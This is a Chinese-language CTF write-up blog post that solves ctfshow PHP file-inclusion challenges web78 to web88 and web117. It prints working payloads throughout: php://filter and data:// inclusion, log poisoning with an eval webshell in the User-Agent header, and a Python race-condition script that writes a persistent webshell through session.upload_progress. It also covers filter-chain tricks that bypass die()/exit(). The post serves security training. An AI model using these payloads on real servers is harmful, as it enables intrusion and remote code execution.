@@ -1,0 +1,230 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>文件包含-ctfshow | young</title><meta name="keywords" content="CTF"><meta name="author" content="Yangyangyang"><meta name="copyright" content="Yangyangyang"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="web78直接使用php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php读取即可。 web79这里把php替换成???,可以考虑data:&#x2F;&#x2F;协议(自PHP&gt;&#x3D;5.2.0起，可以使用data:&#x2F;&#x2F;数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。) 所以，可以">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含-ctfshow">
+<meta property="og:url" content="https://drink-yang.github.io/2022/11/06/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-ctfshow/index.html">
+<meta property="og:site_name" content="young">
+<meta property="og:description" content="web78直接使用php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php读取即可。 web79这里把php替换成???,可以考虑data:&#x2F;&#x2F;协议(自PHP&gt;&#x3D;5.2.0起，可以使用data:&#x2F;&#x2F;数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。) 所以，可以">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-11-06T12:28:45.000Z">
+<meta property="article:modified_time" content="2022-11-08T14:55:54.195Z">
+<meta property="article:author" content="Yangyangyang">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://drink-yang.github.io/2022/11/06/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-ctfshow/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '文件包含-ctfshow',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-11-08 22:55:54'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">young</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">文件包含-ctfshow</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-06T12:28:45.000Z" title="发表于 2022-11-06 20:28:45">2022-11-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-11-08T14:55:54.195Z" title="更新于 2022-11-08 22:55:54">2022-11-08</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="文件包含-ctfshow"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><p>直接使用php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php读取即可。</p>
+<h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><p>这里把php替换成???,可以考虑data:&#x2F;&#x2F;协议(自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。)</p>
+<p>所以，可以使用data伪协议+短标签来绕过</p>
+<blockquote>
+<p>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?=system('cat flag*')?></p>
+</blockquote>
+<p>关于PHP短标签，有如下几种类型</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> ``<span class="comment">/*程序操作*/</span>` `<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?=</span>``<span class="comment">/*函数*/</span>``<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><p>这里利用的是日志包含，先来看一下日志包含的成因及用法</p>
+<blockquote>
+<p>日志的位置</p>
+<p>Apache：&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log</p>
+<p>nginx：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log或者&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</p>
+<p>当访问一个不存在的资源时，Apache日志同样会记录 例如访问<a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1/</a><?php phpinfo();?>。Apache会记录请求“<?php phpinfo();?>”，并写到access.log文件中，这时候去包含access.log就可以利用包含漏洞但并不能直接利用，原因是直接访问URL后，一句话木马在日志文件中被编码了 需要通过burpsuite拦截直接访问<a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1/</a><?php phpinfo();?> 就能生成包含一句话木马的access.log文件；</p>
+<p>同理，也是可以通过设置UA来getshell的。</p>
+</blockquote>
+<p>所以本题的做法就是，先在UA中设置<?php eval($_POST[1]);?>然后再post 1进行命令执行即可</p>
+<h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><p>同上，进行日志包含即可。</p>
+<h2 id="web82-86"><a href="#web82-86" class="headerlink" title="web82-86"></a>web82-86</h2><p>这里利用的是session.upload_progress包含漏洞。</p>
+<p>这里参考了<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/202819.html">此篇文章</a></p>
+<blockquote>
+<p>php中的session.upload_process</p>
+<p>在默认配置下</p>
+<p>session.upload_process.enabled&#x3D;on—-这个属性表示upload_progress功能开启，也就是<strong>当浏览器向服务器上传一个文件时，PHP会把此次文件上传的详细信息存储在session中</strong></p>
+<p>session.upload_process.cleanup&#x3D;on—-表示当文件上传结束后，PHP会立即清空对应session文件的内容；</p>
+<p>session.upload_progress.name &#x3D; “PHP_SESSION_UPLOAD_PROGRESS”—-name的值是可控的；</p>
+<p>session.use_strict_mode&#x3D;off—-这个选项默认值为off，表示我们对Cookie中sessionid可控。</p>
+</blockquote>
+<p>如果session.auto_start()&#x3D;on,那么PHP在接受请求时会自动初始化session，不需要session_start(),但默认情况下，这个选项都是关闭的。</p>
+<p>但session.use_strict_mode默认为off，此时我们可以定义自己的sessionid。</p>
+<p>即改变cookie中的PHPSESSID&#x3D;yang,那么服务器就会创建sess_yang，此时PHP会自动初始化session。</p>
+<p>至于session文件中的内容我们可以利用设置PHP_SESSION_UPLOAD_PROGRESS来实现。</p>
+<p>至于上传的文件会被立刻清理，我们可以采用python多线程，进行条件竞争。</p>
+<p>这里直接给出一个脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://192.168.2.128/test.php&quot;</span> <span class="comment">#目标网站</span></span><br><span class="line">sessid = <span class="string">&quot;Lxxx&quot;</span><span class="comment">#session文件名</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">   filebytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">   <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">       res = session.post(url,</span><br><span class="line">           data=&#123;</span><br><span class="line">               <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span></span><br><span class="line">              &#125;,</span><br><span class="line">           cookies=&#123;</span><br><span class="line">               <span class="string">&#x27;PHPSESSID&#x27;</span>: sessid</span><br><span class="line">              &#125;,</span><br><span class="line">           files=&#123;</span><br><span class="line">               <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;Lxxx.jpg&#x27;</span>, filebytes)</span><br><span class="line">              &#125;</span><br><span class="line">          )</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">   <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">       res = session.post(url+<span class="string">&quot;?a=/tmp/sess_&quot;</span>+sessid,</span><br><span class="line">                          data=&#123;</span><br><span class="line">                              <span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/www/admin/localhost_80/wwwroot/1.php&#x27; , &#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span><span class="comment">#这里1就是上边写入木马的密码</span></span><br><span class="line">                          &#125;,</span><br><span class="line">                          cookies=&#123;</span><br><span class="line">                              <span class="string">&quot;PHPSESSID&quot;</span>:sessid</span><br><span class="line">                          &#125;</span><br><span class="line">                          )</span><br><span class="line">       res2 = session.get(<span class="string">&quot;http://192.168.2.128/1.php&quot;</span>)</span><br><span class="line">       <span class="keyword">if</span> res2.status_code == <span class="number">200</span>:</span><br><span class="line">           <span class="built_in">print</span>(<span class="string">&quot;成功写入一句话！&quot;</span>)</span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           <span class="built_in">print</span>(<span class="string">&quot;Retry&quot;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">   evnet = threading.Event()</span><br><span class="line">   <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:<span class="comment">#使用5个线程</span></span><br><span class="line">       <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">           threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">       <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">           threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">   evnet.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
+
+<h2 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h2><p>源代码为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 21:57:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里用到file_put_contents(),以及die(),就有点像死亡绕过。</p>
+<p>注意，这里要对file进行二次编码绕过，因为第一次是浏览器解码，第二次是urldecode()解码。</p>
+<h3 id="使用base64绕过"><a href="#使用base64绕过" class="headerlink" title="使用base64绕过"></a>使用base64绕过</h3><blockquote>
+<p>原理:</p>
+<p>利用 php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php</p>
+<p>可以对后面的内容进行base64解码，从而去除死亡die.</p>
+<p>因为base64只对a-z,A-Z,0-9,+,&#x2F;,进行解码，并且解码时是4个一组；</p>
+<p>所以我们要对”phpdie”后面补上两个字母。</p>
+</blockquote>
+<p>实验过程：</p>
+<ul>
+<li><p>对php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php进行二次编码—-使用burp上面的，在线网站好像编不了字母。</p>
+<p><img src="E:\myblog\hexo\source_posts\文件包含-ctfshow\web87-1.png" alt="1"></p>
+</li>
+<li><p>对content内容进行base64编码，前面补上aa</p>
+<p><img src="E:\myblog\hexo\source_posts\文件包含-ctfshow\web87-2.png" alt="2"></p>
+</li>
+<li><p>直接访问上传的文件</p>
+<p><img src="E:\myblog\hexo\source_posts\文件包含-ctfshow\web87-3.png" alt="3"></p>
+</li>
+</ul>
+<h3 id="使用字符串"><a href="#使用字符串" class="headerlink" title="使用字符串"></a>使用字符串</h3><p>我们可以利用strip_tags()来去除<?php die()?>这一个XML标签。</p>
+<p>所以我们思路是</p>
+<blockquote>
+<p>先把原有的PHP标签去除，把content内容编码，最后解码</p>
+<p>但是我在实现时，它提示：<strong>Deprecated</strong>: file_put_contents(): The string.strip_tags filter is deprecated in <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</strong> on line <strong>21</strong> </p>
+<p>Emmmm…..(后来了解了一下，是PHP7.3之后不再支持这个过滤器了。)</p>
+</blockquote>
+<h3 id="使用rot13"><a href="#使用rot13" class="headerlink" title="使用rot13"></a>使用rot13</h3><p>这里原理跟上面基本一致，但要求PHP不能开启短标签（P神说的）。</p>
+<h3 id="过滤器的嵌套"><a href="#过滤器的嵌套" class="headerlink" title="过滤器的嵌套"></a>过滤器的嵌套</h3><p>在网上找到这样的payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span>=<span class="string">&#x27;php://filter/zlib.deflate|string.tolower|zlib.inflate|/resource=adam.php&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span>=<span class="string">&#x27;php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0d@eval($_POST[cmd]);?&gt;/resource=adam.php&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>先进行压缩，然后转小写，最后解压缩，在这个过程中目标代码不会变化(具体原理不太懂)</p>
+<h3 id="file-put-contents-a-”-lt-php-exit-”-a"><a href="#file-put-contents-a-”-lt-php-exit-”-a" class="headerlink" title="file_put_contents($a,”&lt;?php exit();”.$a);"></a>file_put_contents($a,”&lt;?php exit();”.$a);</h3><p>这里也是看到<a target="_blank" rel="noopener" href="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/">cyc1e师傅</a>的文章，就来总结一下。</p>
+<p>像这样代码，我们主要也是要去除死亡exit(),但直接base64是行不通的，具体可看上面那位师傅的，ROT13仍然可以用，但是跟前面一样，需要PHP不开启短标签。</p>
+<p>因此，这里主要采用了iconv字符编码转换。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;php://filter//convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)&gt;?/resource=1.php&#x27;</span>;</span><br><span class="line"><span class="comment">//?&lt;hp phpipfn(o;)&gt;?是&lt;?php phpinfo();?&gt;经过UCS-2编码转换后得到。</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;php://filter//convert.iconv.UCS-4LE.UCS-4BE|xxx?&lt;aa phpiphp(ofn&gt;?;)/resource=1.php&#x27;</span>;</span><br><span class="line"><span class="comment">#由于是4位一反转，所以需要保证?&lt;aa phpiphp(ofn&gt;?;)之前字符个数是4的倍数，所以需要补3个字符(这里补上三个字符是因为exit(),那里不是4的倍数)</span></span><br></pre></td></tr></table></figure>
+
+<p>这里是可以将构造的shell放在过滤器的位置或者文件名的位置，虽然PHP会warning，但不影响执行。</p>
+<h2 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h2><p>源代码为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-17 02:27:25</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里可以使用data:&#x2F;&#x2F;+base64编码；</p>
+<p>此外，这里过滤了&#x3D;，可以通过在原代码中添加空格来尝试消除。</p>
+<h2 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h2><p>这个就是利用iconv编码，上边已经提到了。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://drink-yang.github.io">Yangyangyang</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://drink-yang.github.io/2022/11/06/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-ctfshow/">https://drink-yang.github.io/2022/11/06/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-ctfshow/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://drink-yang.github.io" target="_blank">young</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/11/05/%E7%BB%95%E8%BF%87basedir%E8%8E%B7%E5%8F%96%E7%9B%AE%E5%BD%95-%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">绕过basedir获取目录+读取文件</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/10/15/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/" title="PHP反序列化pop链"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-15</div><div class="title">PHP反序列化pop链</div></div></a></div><div><a href="/2022/10/14/PHP%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%BC%8F%E6%B4%9E/" title="PHP伪随机数漏洞"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt 